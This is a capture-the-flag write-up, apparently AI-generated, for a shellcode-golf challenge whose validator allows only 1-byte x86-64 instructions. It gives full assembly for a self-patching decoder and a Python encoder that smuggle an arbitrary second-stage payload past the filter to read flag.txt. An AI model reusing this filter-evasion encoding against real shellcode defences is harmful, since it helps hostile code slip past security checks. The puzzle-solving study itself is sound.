# shellminning

> **AI-generated and AI-verified.** This writeup was produced by an AI after the
> competition ended (its author competed in the human division). Every version
> below was generated and verified end-to-end against the real challenge
> binary (the flag printed, repeatedly, across many runs).

We must submit a hex shellcode that gets validated and run by a small C harness.
The harness `mmap`s a random RWX page, zeroes **all** registers (including
`rsp` and `r8-r15`), installs a seccomp filter that allows only `open`(2) and
`sendfile`(40), reads our shellcode into the page, and jumps to it. The
shellcode must be composed **only of 1-byte instructions** plus `syscall`
(`0f 05`) — anything else is rejected by the capstone-based validator:

```python
#!/usr/local/bin/python3
from capstone import *
import sys
import subprocess

shellcode = bytes.fromhex(input("Enter shellcode (hex): "))

md = Cs(CS_ARCH_X86, CS_MODE_64)

processed = 0
for address, size, mnemonic, op_str in md.disasm_lite(shellcode, 0):
    if size != 1 and (size != 2 or mnemonic != "syscall"):
        print("Shellcode validation failed")
        sys.exit(1)
    processed += size

if processed != len(shellcode):
    print("Not all bytes were processed")
    sys.exit(1)

print("Shellcode validation passed")

r = subprocess.run(
    ['./chal'],
    input=shellcode,
    text=False,
    capture_output=True
)

print(f"Result: {r.stdout}")
```

The score is `0x800 - len(shellcode)`, so the goal is the *shortest* shellcode
that prints the flag (`flag.txt` in the cwd). The constraints make this very
hard: with no stack (rsp=0), no immediates, no access to `r8-r15` at all (no
1-byte instruction touches them; `syscall` only clobbers `rcx`/`r11`), even
producing the string `"flag.txt"`, the syscall numbers `2`/`40`, or the
sendfile `count` (r10) is non-trivial.

## Version 1 — pointer-walk value production, score 1174 (874 B)

The first working approach uses the observation that **the low byte of any page
pointer equals its offset mod 256**. Because the page base is 4K-aligned, a
pointer like `rsi = page+0x66` has low byte `0x66` — we can *write* any byte
value `V` by positioning a pointer at offset `V` (via `lodsd`/`lodsb` walks)
and doing `xchg esi,eax; stosb`. The shellcode:

1. `syscall` → `rcx = page+0x32` (a fixed offset).
2. sets `rsp = page+0x32` (via `xchg esp,eax`) to get a stack in the page;
3. walks `rsi` through chosen offsets, writing `"flag.txt\0"`, the syscall-arg
   dwords `[2]`, `[40]`, `[1]`, and a self-modified `xchg eax,r10d` (the bytes
   `41 92` — a REX.B prefix followed by `xchg edx,eax` — written into the flow)
   so that `r10` becomes a huge sendfile count;
4. then uses 1-byte instructions to `open("flag.txt")` and `sendfile`.

This is correct but huge: each written byte costs several instructions of
pointer positioning. Optimization then focused on shrinking the value
production and the self-modifying scaffolding:

- **Version 1.1, score 1274 (774 B)** — fewer walks, tighter register reuse.
- **Version 2, score 1739 (309 B)** — the big jump. The sendfile `count`
  (`r10`, unreachable by any 1-byte instruction) is finally set by
  **self-modifying code**: the bytes `41 92` (`xchg eax,r10d` — a REX.B
  prefix plus an `xchg edx,eax`) are written over two nops in the flow and
  executed while `eax` holds a page pointer, so `r10` becomes a huge count (any
  page pointer is ≥ 95, so any value works). The string and the syscall-arg
  dwords are written at the cheapest available pointer positions.
  Through score 1824 (224 B) the same architecture is progressively shaved
  (fewer padding instructions, smaller walks, fused stores).

## Version 3 — the difference encoding (pitust's approach), score 1933 (115 B)

The real breakthrough came from studying a reference solution shared by
[**pitust**](https://paste.sr.ht/~pitust/ed6acd1b1f1c5a61a5996c06affa03c48d27d0d8)
(an experienced human solver). The core idea: instead of producing
arbitrary bytes from pointer offsets, **encode every stage-2 byte as the
difference of two legal 1-byte instructions**:

```
for every stage-2 byte y, find (a, b) both legal 1-byte opcodes with (a - b) & 0xff == y
```

The decoder is a self-patched `sub`:

- after 6 leading nops the `syscall` sits at offset 6, so `rcx = page+0x38`;
- a small stack dance derives the opcode byte `0x29` (`sub ebx,eax`) from
  `bl = rcx_low - 15`;
- an 8-`lodsd` walk positions `rsi` at the future `sub` slot (page+0x58), which
  is patched from `int3; ret` (`cc c3`) into `sub ebx,eax` (`29 c3`);
- the decode loop reads a dword of "a" bytes (`la`) and a dword of "b" bytes
  (`lb`), computes `chunk = la - lb`, and `stosd`s the stage-2 dword.

The loop is driven by the decoded stage-2 itself: its first bytes are
`jne -9` (`75 f7`), which jumps back to the decoder after each chunk. When the
decoder reaches the zeros past the payload the decoded chunk is 0, `ZF=1`, the
`jne` falls through, and the real stage-2 runs:

```asm
; 33-byte stage-2 (decoded), plus the 2-byte jne driver:
75 f7         jne -9                 ; loop driver
96            xchg eax, esi          ; esi = 0 (open flags)
6a 02 58      push 2; pop rax        ; rax = 2
52            push rdx               ; NUL terminator
48 bf ...     movabs rdi, "flag.txt" ; path on the stack
57            push rdi
48 89 e7      mov rdi, rsp           ; rdi = path
0f 05         syscall                ; open
49 89 fa      mov r10, rdi           ; r10 = path pointer = huge count
6a 01 5f      push 1; pop rdi        ; rdi = 1 (stdout)
96            xchg esi, eax          ; esi = fd
6a 28 58      push 40; pop rax       ; rax = 40
0f 05         syscall                ; sendfile
```

The 44-byte stage-1, written in NASM (with an `org 0x30` since the 48-byte
zeroing base precedes the shellcode in the page). This stage-1 first appeared
at score 1862 (186 B) — the first submission using the difference encoding,
still carrying a longer, buggy stage-2 — and the 33-byte stage-2 shown above is
what brought it down to 115 bytes:

```asm
org 0x30
bits 64
    times 6 nop
    syscall                 ; rcx = page+0x38
    xchg ecx, eax
    xchg esp, eax           ; rsp = page+0x38
    push rcx
    push rcx
    push rsp
    pop rsi                 ; rsi = page+0x28
    pop rcx
    pop rcx                 ; rsp = page+0x38
    lodsb                   ; rsi = page+0x29  -> bl = 0x29 (sub ebx,eax opcode)
    push rsp
    pop rax                 ; rax = page+0x38
    xchg esi, eax           ; esi = page+0x38 (walk base), eax = page+0x29
    xchg ebx, eax           ; ebx = 0x29 (patch byte)
    times 8 lodsd           ; walk: rsi = page+0x38 + 32 = page+0x58
    push rbx
    pop rax                 ; al = 0x29
    push rsi
    pop rdi                 ; rdi = page+0x58 (patch target)
    stosb                   ; patch [0x58] = 0x29 -> sub ebx,eax
    lodsd                   ; rsi = page+0x5C (stage-2 destination)
    push rsi
    pop rdi
loop_start:
    lodsd                   ; eax = la dword
    xchg ebx, eax           ; ebx = la
    lodsd                   ; eax = lb dword
    int3                    ; patched at runtime to: sub ebx, eax
    ret
    xchg ebx, eax           ; eax = chunk
    stosd                   ; write the decoded stage-2 dword
```

This single trick took the solution from 224 bytes (score 1824) to 115 bytes
(score 1933), and its two components — *the self-patched sub* and *the
difference encoding* — are the foundation for everything after.

## Version 4 — fused count/out-fd and stack string, score 1940 (108 B)

The count no longer needs a dedicated `mov r10, rdi`: the count exchange
`xchg r10d, edi` sets `r10 = path pointer` (a huge count) **and** zeroes `rdi`
for `inc edi` to turn it into 1 (stdout) — fusing count and out-fd. The path is
also shortened: `push rsp; pop rdi` (2 bytes) replaces `mov rdi, rsp` (3
bytes):

```asm
96            xchg eax, esi
6a 02 58      push 2; pop rax
52            push rdx               ; NUL
48 bf ...     movabs rdi, "flag.txt"
57            push rdi
54 5f         push rsp; pop rdi      ; rdi = path
0f 05         syscall                ; open
96            xchg esi, eax          ; esi = fd, rax = 0
41 87 fa      xchg r10d, edi         ; r10 = path pointer (count), rdi = 0
ff c7         inc edi                ; rdi = 1
b0 28         mov al, 40             ; rax = 40
0f 05         syscall                ; sendfile
```

## Version 5 — K=0 stage-1, score 1950 (98 B)

The stage-1 was rebuilt around `sub eax,ebx` (opcode `0x2B`), which the K=0
dance produces directly (no leading nops), and the loop shortened to 6 bytes
(the result stays in `eax`, no extra `xchg`). A stack `push rax`/`pop rax`
carries the patch byte across the walk. Stage-1 drops to 33 bytes:

```asm
; 33-byte stage-1
0f05            syscall                ; rcx = page+0x32
91 94           xchg ecx,eax ; xchg esp,eax
51 54 5e 59     push rcx; push rsp; pop rsi; pop rcx   ; rsi = page+0x2A
ac              lodsb                  ; rsi = page+0x2B -> bl = 0x2B (sub eax,ebx)
54 58           push rsp; pop rax      ; rax = page+0x32
96              xchg esi,eax           ; esi = page+0x32 (walk base), eax = page+0x2B
50              push rax               ; save the patch byte
ad*7            walk 7 lodsd           ; rsi = page+0x4E
58              pop rax                ; al = 0x2B
56 5f           push rsi; pop rdi      ; rdi = page+0x4E
aa              stosb                  ; patch [0x4E] = 0x2B -> sub eax,ebx
ad 56 5f        lodsd; push rsi; pop rdi   ; rdi = page+0x52 (stage-2 dest)
ad 93 ad        lodsd; xchg ebx,eax; lodsd ; loop: la; lb
cc c3           int3; ret  (patched to sub eax,ebx)
ab              stosd                  ; write decoded stage-2 dword
```

## Version 6 — trailing string, score 1952 (96 B)

The big stage-2 string setup (movabs + push + rsp gymnastics, 14 bytes) is
eliminated by decoding `"flag.txt\0"` as **trailing data** after the code, and
deriving the path from the decode-end pointer:

```asm
83 ef 0f        sub edi, 0xf           ; rdi = dest+36-15 = dest+21 = "flag.txt\0"
...
666c61672e74787400  ; "flag.txt\0" decoded as data (never executed)
```

`rdi` at stage-2 entry is `dest+36` (the decode pointer after the last chunk),
so the string address is a *fixed* 15 bytes back — one `sub edi,imm8`.

## Version 7 — fusing count and flags, score 1953 (95 B)

`xchg r10d, esi` does two jobs at once: it moves the payload pointer into
`r10` (the huge sendfile count) **and** zeroes `esi` (the open flags), since
the old `r10` is 0. Combined with `mov al,2` (entry `rax=0`), the whole
`(count, flags, rax=2)` setup is 5 bytes:

```asm
41 87 f2        xchg r10d, esi         ; r10 = payload ptr (count), esi = 0
b0 02           mov al, 2              ; rax = 2
83 ef 10        sub edi, 0x10          ; rdi = dest+36-16 = dest+20 = string
0f 05           syscall                ; open
96              xchg esi, eax          ; esi = fd, rax = 0
6a 01 5f        push 1; pop rdi        ; rdi = 1
b0 28           mov al, 40
0f 05           syscall                ; sendfile
```

## Version 8 — the zero chunk terminates the string, score 1958 (90 B)

The final NUL byte is dropped from the encoded stage-2: the string is exactly 8
bytes (`"flag.txt"`), and the decoder's *zero chunk* (the 4 zero bytes it
writes past the payload before falling through) provides the terminator at
`dest+28`. This removes one stage-2 byte and — crucially — crosses a chunk
boundary, taking the payload from 61 to 56 bytes:

```asm
75 f7           jne -9
41 87 f2        xchg r10d, esi
b0 02           mov al, 2
83 ef 0c        sub edi, 0xc           ; rdi = dest+32-12 = dest+20 = "flag.txt"
0f 05           syscall                ; open
96              xchg esi, eax
6a 01 5f        push 1; pop rdi
b0 28           mov al, 40
0f 05           syscall                ; sendfile
666c61672e747874  ; "flag.txt" (8 bytes; NUL comes from the zero chunk)
```

Here is the complete 90-byte solution as NASM assembly — stage-1 (33 bytes,
including the `int3;ret` slot that becomes `sub eax,ebx` and the single pad
byte), plus the stage-2 (28 bytes) as it is decoded:

```asm
; ===== stage-1 (33 bytes), assembled at page+0x30 =====
org 0x30
bits 64
    syscall                 ; rcx = page+0x32
    xchg ecx, eax
    xchg esp, eax           ; rsp = page+0x32
    push rcx
    push rsp
    pop rsi                 ; rsi = page+0x2A
    pop rcx
    lodsb                   ; rsi = page+0x2B  -> bl = 0x2B (sub eax,ebx opcode)
    push rsp
    pop rax                 ; rax = page+0x32
    xchg esi, eax           ; esi = page+0x32 (walk base), eax = page+0x2B
    push rax                ; stash the patch byte across the walk
    times 7 lodsd           ; walk: rsi = page+0x32 + 28 = page+0x4E
    pop rax                 ; al = 0x2B
    push rsi
    pop rdi                 ; rdi = page+0x4E (the sub slot)
    stosb                   ; patch [0x4E] = 0x2B -> sub eax,ebx
    lodsd                   ; rsi = page+0x52 (stage-2 destination)
    push rsi
    pop rdi
loop_start:                 ; = page+0x4B
    lodsd                   ; eax = la dword
    xchg ebx, eax           ; ebx = la
    lodsd                   ; eax = lb dword
    int3                    ; patched at runtime to: sub eax, ebx
    ret
    stosd                   ; write the decoded stage-2 dword to [rdi]
    db 0x90                 ; pad byte at page+0x51 (flow lands here; dest = 0x52)

; ===== stage-2 (28 bytes), decoded at page+0x52 =====
; (produced by the difference encoder; the bytes are not assembled from this listing)
    jne loop_start          ; jne -9 : drive the decoder back to the loop
    xchg r10d, esi          ; r10 = payload pointer (huge count), esi = 0 (open flags)
    mov al, 2               ; rax = 2 (open)
    sub edi, 0xc            ; rdi = dest+32-12 = dest+20 = "flag.txt"
    syscall                 ; open("flag.txt", 0, 0) -> fd
    xchg esi, eax           ; esi = fd, rax = 0
    push 1
    pop rdi                 ; rdi = 1 (stdout)
    mov al, 40              ; rax = 40 (sendfile)
    syscall                 ; sendfile(1, fd, 0, r10)
    db "flag.txt"           ; trailing string; the decoder's zero chunk writes the NUL
```

## After the competition

The author of this writeup competed in the human division; the AI work below
was done after the competition ended, as a post-mortem of the challenge.
During the competition itself:

- **1933 (115 B) was the best human submission** — the pitust reference
  described in Version 3;
- **1967 (81 B) was the best AI submission** — another AI agent in the
  competition found an even shorter solution (we never saw it, so we do not
  know whether it shares this architecture);
- our own best verified result (found post-competition) was the 90-byte
  shellcode above (score 1958).

## The encoder

The final payload is produced by encoding the stage-2 with the difference
table (each byte `y = (lb - la) & 0xff`, borrow-propagated per dword, `la`
padded to 4 bytes):

```python
LEGAL = [0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,
         0x6c,0x6d,0x6e,0x6f,0x90,0x91,0x92,0x93,0x94,0x95,0x96,0x97,0x98,0x99,0x9b,0x9c,
         0x9d,0x9e,0x9f,0xa4,0xa5,0xa6,0xa7,0xaa,0xab,0xac,0xad,0xae,0xaf,0xc3,0xc9,0xcb,
         0xcc,0xcf,0xd7,0xec,0xed,0xee,0xef,0xf1,0xf4,0xf5,0xf8,0xf9,0xfa,0xfb,0xfc,0xfd]
S = {(a-b) & 0xff: (a, b) for a in LEGAL for b in LEGAL}

def encode(shellcode):
    out = b""
    for x in range(0, len(shellcode), 4):
        la = b""; lb = b""; borrow = 0
        for y in shellcode[x:x+4]:
            y_eff = (y + borrow) & 0xff
            aa, bb = S[y_eff]              # aa - bb == y_eff
            borrow = 1 if (aa - bb - borrow) < 0 else 0
            la += bytes([bb])              # runtime chunk = lb - la = aa - bb
            lb += bytes([aa])
        while len(la) != 4:                # pad la (the runtime lb reads zeros)
            pad = (0xcc + borrow) & 0xff
            aa, bb = S[pad]
            borrow = 1 if (aa - bb - borrow) < 0 else 0
            la += bytes([bb])
        out += la + lb
    return out
```

## Takeaway

The challenge is a long chain of "how do I smuggle an arbitrary x86-64 program
through a 1-byte-instruction validator". The winning formula:

1. **Self-modifying code** unlocks the full ISA (REX-prefixed instructions,
   `r10` access, arbitrary opcodes) because the RWX page is both written and
   executed;
2. **the difference encoding** packs arbitrary bytes at exactly 2 legal bytes
   each, with a self-patched `sub` as the decoder and the decoded stage-2's own
   `jne -9` as the loop driver;
3. **every remaining byte** is shaved by fusing instructions (`xchg r10d,esi`
   = count + flags), moving constants into the decoder's end-state (trailing
   string, zero-chunk NUL), and choosing chunk boundaries to minimise payload
   padding.

The final 90-byte shellcode (score 1958) was generated and verified entirely by
us after the competition. In the competition itself, the best human submission
reached 115 bytes (score 1933, pitust's reference) and the best AI submission
reached 81 bytes (score 1967).
